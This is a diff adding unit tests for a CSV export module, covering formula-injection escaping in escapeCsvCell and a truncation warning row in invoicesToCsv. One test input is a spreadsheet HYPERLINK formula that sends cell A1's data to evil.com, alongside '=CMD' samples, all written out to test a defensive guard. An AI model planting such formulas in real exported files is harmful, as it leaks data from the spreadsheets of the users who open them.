@@ -27,6 +27,27 @@ describe("escapeCsvCell", () => {
     expect(escapeCsvCell(null)).toBe("");
     expect(escapeCsvCell(undefined)).toBe("");
   });
+
+  it("prefixes formula-trigger characters with single quote", () => {
+    expect(escapeCsvCell("=HYPERLINK(\"http://evil.com/?d=\"&A1,\"Xem\")")).toBe(
+      `"'=HYPERLINK(""http://evil.com/?d=""&A1,""Xem"")"`,
+    );
+    expect(escapeCsvCell("=1+2")).toBe("'=1+2");
+    expect(escapeCsvCell("+SUM(A1:A10)")).toBe("'+SUM(A1:A10)");
+    expect(escapeCsvCell("-SUM(A1:A10)")).toBe("'-SUM(A1:A10)");
+    expect(escapeCsvCell("@SUM(A1:A10)")).toBe("'@SUM(A1:A10)");
+    expect(escapeCsvCell("\t=CMD")).toBe("'\t=CMD");
+    // \r triggers both formula-injection guard AND RFC 4180 quoting
+    expect(escapeCsvCell("\r=CMD")).toBe(`"'\r=CMD"`);
+  });
+
+  it("does not prefix non-trigger characters", () => {
+    expect(escapeCsvCell("hello")).toBe("hello");
+    expect(escapeCsvCell("123")).toBe("123");
+    expect(escapeCsvCell("*bold*")).toBe("*bold*");
+    expect(escapeCsvCell("/path")).toBe("/path");
+    expect(escapeCsvCell("$100")).toBe("$100");
+  });
 });
 
 describe("invoicesToCsv", () => {
@@ -139,5 +160,35 @@ describe("invoicesToCsv", () => {
     for (let i = 1; i < lines.length; i++) {
       expect(lines[i].split(",").length).toBe(headerCols);
     }
+  });
+
+  it("includes a truncation warning row when truncated is true", () => {
+    const csv = invoicesToCsv([], { truncated: true });
+    const lines = csv.trim().split("\n");
+    expect(lines).toHaveLength(2); // BOM + header, warning
+    expect(lines[1]).toContain("5,000");
+  });
+
+  it("includes warning row before data rows when truncated", () => {
+    const row = normalizeInvoice({
+      id: "1",
+      vendor: "Acme",
+      invoice_number: null,
+      amount: null,
+      currency: null,
+      issue_date: null,
+      due_date: null,
+      tax: null,
+      source: "upload",
+      needs_review: false,
+      confidence_score: null,
+      created_at: "2026-01-01",
+    });
+
+    const csv = invoicesToCsv([row], { truncated: true });
+    const lines = csv.trim().split("\n");
+    expect(lines).toHaveLength(3); // BOM + header, warning, data
+    expect(lines[1]).toContain("5,000"); // warning is row 2
+    expect(lines[2]).toContain("Acme"); // data is row 3
   });
 });
